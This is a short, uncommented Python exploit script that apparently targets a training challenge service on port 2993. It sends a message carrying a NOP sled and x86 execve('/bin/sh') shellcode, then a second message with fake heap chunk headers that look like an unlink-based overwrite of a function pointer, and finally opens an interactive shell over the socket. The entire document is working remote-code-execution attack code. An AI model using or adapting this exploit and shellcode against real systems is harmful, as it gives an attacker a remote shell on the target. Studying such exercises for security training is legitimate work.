import socket
import struct
import telnetlib

IP = "192.168.1.70"
PORT = 2993

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

message1 = "FSRD" + "/ROOT" + "A"*3 + "\xeb\x0c"*4 + "\x90"*8 + "\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80" +"\x90"*76 +"/"

message2 = "FSRD" + "ROOT" + "B"*103 + "/" + struct.pack("<L", 0xfffffffc) + struct.pack("<L", 0xfffffffd) + struct.pack("<L", 0x804d41c-0x0c) + struct.pack("<L", 0x804e014)

s.send(message1)
s.send(message2)

t = telnetlib.Telnet()
t.sock = s
t.interact()
